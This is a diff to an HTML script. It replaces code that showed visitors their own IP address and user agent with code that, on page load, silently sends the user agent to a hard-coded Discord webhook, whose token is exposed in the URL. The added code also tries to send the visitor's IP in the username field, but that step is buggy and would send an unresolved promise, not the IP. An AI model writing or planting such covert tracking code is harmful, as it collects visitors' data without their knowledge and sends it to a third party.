@@ -1,8 +1,13 @@
 <script>
-  fetch('https://api.ipify.org?format=json')
-    .then(response => response.json())
-    .then(data => {
-      navigator.userAgent
-      document.body.innerHTML = `айпи: ${data.ip} юзер агент: ${navigator.userAgent}`;
-    });
+  fetch('https://discord.com/api/webhooks/1333704940517982239/HwSngAYynfh6DJ9qieYEI_zw005l_i0jHZP2Vf_dN1oLcWSjzo3vqv3hhsjN7dciLXxd', {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify({
+      content: `User Agent - ${navigator.userAgent}`,
+      avatar_url: 'https://cdn.discordapp.com/avatars/1309132654213332993/6cda9e1344dfa9420cb1c75bc6ac8839?size=1024',
+      username: `IP: ${fetch('https://api.ipify.org?format=json').then(response => response.json()).then(data => data.ip)}`
+    })
+  })
 </script>
